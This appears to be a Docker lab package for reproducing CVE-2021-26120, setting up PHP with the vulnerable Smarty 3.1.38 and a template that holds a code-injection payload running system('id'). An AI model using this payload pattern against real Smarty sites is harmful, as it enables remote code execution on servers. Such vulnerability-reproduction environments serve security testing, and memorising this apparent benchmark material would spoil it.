{
    "files": [
        {
            "location": "./../../dockers/CVE-2021-26120/custom_no_tool/docker-compose.yml",
            "content": "version: '3.8'\n\nservices:\n  php:\n    build: .\n    container_name: php_smarty\n    volumes:\n      - ./src:/var/www/html\n    ports:\n      - \"8080:80\"\n    networks:\n      - cvetest\n\nnetworks:\n  cvetest:\n    driver: bridge\n"
        },
        {
            "location": "./../../dockers/CVE-2021-26120/custom_no_tool/Dockerfile",
            "content": "FROM php:7.4-apache\n\n# Install dependencies\nRUN apt-get update && apt-get install -y \\\n    libzip-dev \\\n    unzip \\\n    && docker-php-ext-install zip\n\n# Install composer\nCOPY --from=composer:latest /usr/bin/composer /usr/bin/composer\n\n# Install Smarty 3.1.38\nRUN composer require smarty/smarty:3.1.38\n\n# Copy application source\nCOPY src/ /var/www/html/\n\n# Set working directory\nWORKDIR /var/www/html\n\n# Enable Apache mod_rewrite\nRUN a2enmod rewrite\n\n# Expose port 80\nEXPOSE 80\n\n# Start Apache\nCMD [\"apache2-foreground\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2021-26120/custom_no_tool/src/index.php",
            "content": "<?php\nrequire('vendor/autoload.php');\n\n$smarty = new Smarty;\n$smarty->setTemplateDir('/var/www/html/templates');\n$smarty->setCompileDir('/var/www/html/templates_c');\n$smarty->setCacheDir('/var/www/html/cache');\n$smarty->setConfigDir('/var/www/html/configs');\n\n// Display the template\n$smarty->display('index.tpl');\n"
        },
        {
            "location": "./../../dockers/CVE-2021-26120/custom_no_tool/src/templates/index.tpl",
            "content": "{* Smarty template vulnerable to CVE-2021-26120 *}\n{* This template is used to demonstrate the vulnerability *}\n\nHello, this is a vulnerable Smarty template.\n\n{if rce(){};system(\"id\");function}This is a test of the RCE vulnerability.{/if}\n"
        }
    ],
    "directory_tree": "CVE-2021-26120/\n\u2514\u2500\u2500 custom_no_tool\n    \u251c\u2500\u2500 Dockerfile\n    \u251c\u2500\u2500 docker-compose.yml\n    \u2514\u2500\u2500 src\n        \u251c\u2500\u2500 index.php\n        \u2514\u2500\u2500 templates\n            \u2514\u2500\u2500 index.tpl\n"
}